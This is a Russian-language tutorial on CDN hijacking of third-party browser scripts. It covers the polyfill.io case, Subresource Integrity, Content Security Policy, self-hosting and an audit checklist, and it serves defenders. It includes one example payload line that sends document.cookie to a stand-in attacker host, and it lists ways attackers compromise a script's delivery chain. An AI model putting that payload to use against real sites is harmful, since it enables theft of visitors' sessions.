## Вопрос, с которого всё начинается

Страница магазина подключает библиотеку-полифилл со стороннего CDN:

```html
<script src="https://cdn.polyfill.example/v3/polyfill.min.js"></script>
```

Браузер каждого посетителя скачивает этот файл с чужого сервера и **исполняет его в контексте твоего домена**. То есть у кода с этого сервера есть доступ к cookie, к localStorage, к DOM страницы и к любым запросам от имени пользователя. Если содержимое файла изменится — изменится и поведение твоего сайта, без единого коммита в твоём репозитории.

Это **CDN hijacking** — компромисс звена доставки. Самый громкий пример — `polyfill.io` в 2024 году: домен сменил владельца, новый владелец подменил содержимое, и тысячи сайтов стали грузить вредоносный скрипт, пока его не вырезали.

## Почему сторонние скрипты так опасны

Разница между зависимостью на сервере и скриптом в браузере принципиальна. Серверная зависимость исполняется в песочнице процесса, часто без доступа к секретам. Браузерный скрипт исполняется в **полном контексте origin**: он видит cookie сессии (если они не HttpOnly), токены в localStorage, содержимое форм, историю запросов. Один подменённый файл — и атакующий читает сессию всех посетителей.

Классический payload минимален:

```js
fetch('https://evil.example/c?d=' + btoa(document.cookie));
```

Эта строка в подменённом `polyfill.min.js` уводит сессии всех, кто открыл страницу.

## Наш пример: разбор страницы

Договоримся о примере. Откроем `index.html` магазина:

```html
<script src="https://cdn.jsdelivr.example/polyfill.min.js"></script>
<script src="/static/app.js"></script>
```

Первый скрипт — сторонний, без атрибута `integrity`. Второй — свой, с нашего origin. Именно первый и является вектором: у него нет проверки целостности, значит подмена не будет обнаружена браузером.

## Как работает Subresource Integrity

**SRI** — это атрибут `integrity` с хешем содержимого:

```html
<script src="https://cdn.jsdelivr.example/polyfill.min.js"
        integrity="sha384-9f8b2c...="
        crossorigin="anonymous"></script>
```

Браузер скачивает файл, считает хеш и сравнивает. Не совпало — скрипт не исполняется. Это единственный механизм, который защищает от подмены содержимого на стороне CDN. Ограничения: хеш нужно обновлять при каждой смене версии библиотеки, а для динамически подгружаемых скриптов он неудобен — поэтому его часто не ставят.

## Векторы компромисса CDN

Как атакующий попадает в звено доставки:

- **Смена владельца домена.** Домен библиотеки продают или не продлевают — новый владелец распоряжается содержимым.
- **Захват аккаунта CDN.** Токен публикации угнан — можно заменить файл.
- **Взлом origin-сервера библиотеки.** Если CDN тянет файлы с сервера проекта, компромисс сервера меняет раздачу.
- **MITM без HTTPS.** Если скрипт грузится по HTTP, содержимое подменяется в канале.
- **Зависимость от зависимости.** Сторонний скрипт сам подгружает второй скрипт — атака уходит на уровень глубже.

## Как проверять цель глазами атакующего

Этичная проверка звена доставки:

1. Собери все сторонние `<script>`, `<link>`, `<iframe>` со страницы.
2. Для каждого — есть ли `integrity`? Если нет, вектор существует.
3. Проверь, жив ли домен и кому принадлежит (`dig`, WHOIS).
4. Сравни загружаемый файл с известной версией библиотеки: расхождения — сигнал подмены.
5. Проверь CSP: если `script-src` разрешает только свои домены, сторонний скрипт не загрузится вообще.

Последний пункт — самая сильная защита после SRI: строгая CSP с allow-list доменов и nonce на инлайн-скрипты.

## Что мы теперь знаем

- Сторонний скрипт исполняется в контексте вашего origin — это XSS-эквивалент.
- Компромисс CDN меняет поведение сайта без изменений в вашем коде.
- SRI проверяет хеш файла и отвергает подменённое содержимое.
- Векторы: смена владельца домена, захват аккаунта, MITM, цепочки зависимостей.
- Защита — SRI плюс строгая CSP с allow-list доменов.

## CSP как основная защита

Subresource Integrity проверяет конкретный файл, но самая широкая защита от сторонних скриптов — **Content Security Policy**. Директива `script-src` перечисляет домены, с которых разрешено исполнять скрипты:

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m' https://trusted.cdn.example; object-src 'none'; base-uri 'none'
```

Разберём директивы. `'self'` разрешает скрипты только с нашего origin. `'nonce-r4nd0m'` — одноразовый токен: только тег `<script nonce="r4nd0m">` будет исполнен, что защищает от инлайн-инъекций. `https://trusted.cdn.example` — единственный разрешённый внешний домен. `object-src 'none'` запрещает плагины, `base-uri 'none'` мешает подмене `<base>`.

Если CSP настроен строго, атакующий не сможет подключить свой скрипт вообще: браузер его не исполнит, даже если тег появился в разметке. Это делает CSP более сильной защитой, чем SRI, но и более сложной в поддержке — нужно вести allow-list доменов и обновлять nonce на каждый запрос.

Ошибка, которую совершают часто: оставляют `script-src 'unsafe-inline'` или `*`. Это полностью обнуляет защиту. Проверка CSP — обязательный шаг аудита.

## Практика: как проверяют сторонние скрипты в аудите

Вот рабочий порядок для реального пентеста:

1. **Собери внешние ресурсы.** Разбери HTML и JS-бандлы на предмет URL с чужих доменов: `script`, `link`, `iframe`, а также динамических загрузок в коде.
2. **Проверь SRI.** Для каждого `<script src>` стороннего домена — есть ли `integrity` и `crossorigin`. Отсутствие — находка.
3. **Проверь CSP.** Заголовок `Content-Security-Policy`: перечислены ли домены явно, есть ли `unsafe-inline`.
4. **Проверь владение доменами.** `dig` и WHOIS: жив ли домен, совпадает ли владелец с библиотекой.
5. **Сравни содержимое.** Скачай файл и сравни с официальной версией библиотеки — расхождения указывают на подмену.

Этот порядок даёт конкретные находки: список скриптов без SRI, слабую CSP, домены с истёкшим сроком. Каждая — отдельный пункт отчёта с оценкой риска.

## Инциденты и уроки

История знает несколько громких случаев компромисса звена доставки. Кроме `polyfill.io`, был случай с британским правительственным сайтом, где сторонний скрипт собирал данные о вводе в формы. Был и захват npm-пакета `ua-parser-js`, который использовался и как серверная, и как клиентская библиотека — вредоносный код добавлялся в оба контекста.

Общий урок: **любой сторонний код — это ваш код с вашими правами**. Нельзя относиться к CDN-скрипту как к картинке. Он исполняется, значит, он доверенный, значит, его нужно проверять так же, как свой. Единственные надёжные границы — SRI, строгая CSP и минимизация числа сторонних доменов.

## Как выбирать, каким сторонним скриптам доверять

Не всякий сторонний скрипт одинаково рискован. Полезно ранжировать их по степени доверия, чтобы сокращать поверхность.

**Самый высокий риск** — скрипты, которые не нужны для работы и добавляют телеметрию: аналитика, A/B-тесты, реклама, чаты поддержки. Они исполняются у всех пользователей, но приносят мало пользы; именно их чаще всего компрометируют.

**Средний риск** — функциональные библиотеки, загружаемые с CDN: полифиллы, UI-фреймворки, шрифты. Их можно и нужно переносить на свой origin или закрывать SRI.

**Низкий риск** — статические ресурсы без исполнения: изображения, шрифты, CSS. CSS-инъекция тоже опасна, но не так, как исполняемый JS.

Практический вывод: **каждый сторонний скрипт должен оправдывать своё существование**. Если функцию можно реализовать локально без потери качества — лучше локально. Каждый лишний домен в `script-src` — это дополнительная поверхность атаки.

## Self-hosting: перенос библиотек к себе

Самый надёжный способ убрать риск CDN — **раздавать библиотеки со своего origin**. Тогда компромисс чужого домена на тебя не влияет.

```
$ npm install polyfill-library
$ cp node_modules/polyfill-library/polyfill.min.js /var/www/static/
```

Теперь в HTML:

```html
<script src="/static/polyfill.min.js"></script>
```

Этот скрипт грузится с твоего сервера, ты контролируешь его содержимое и версии, а CSP может ограничить `script-src 'self'`. Минус — нужно самому обновлять библиотеку и следить за уязвимостями. Плюс — ты независим от чужой инфраструктуры и от смены владельцев доменов.

Для критичных приложений self-hosting плюс строгая CSP — стандарт. CDN-загрузка уместна там, где библиотека действительно тяжела и меняется часто, но и тогда её закрывают SRI.

## Отдельная угроза: цепочки скриптов

Иногда сторонний скрипт сам подгружает второй скрипт. Тогда SRI на первом не защищает второй: браузер исполняет код, который динамически добавил тег `<script>` с чужого домена. CSP с allow-list доменов блокирует такой загрузчик, если его домен не разрешён. Поэтому при аудите смотрят не только на статические теги, но и на динамические загрузки внутри JS: `createElement('script')`, `document.write`, `import()`.

Именно цепочка «скрипт грузит скрипт» стояла за несколькими инцидентами, где вредоносный код появлялся на сайтах, у которых в HTML не было ни одного подозрительного тега.

## Мини-чеклист защиты звена доставки

Соберём практические меры в короткий список. **Self-hosting** библиотек вместо CDN, где возможно. **SRI** с `crossorigin` для всего, что осталось внешним. **Строгая CSP** с allow-list доменов, `nonce` на инлайн-скрипты и без `unsafe-inline`. **Минимизация** числа сторонних доменов: каждый лишний — поверхность. **Мониторинг** содержимого внешних скриптов и алерт на его изменение. **Ревью** новых сторонних ресурсов до добавления на страницу.

Эти меры недороги и закрывают основной вектор. Начинать стоит с CSP: один заголовок отсекает большинство сценариев подмены.
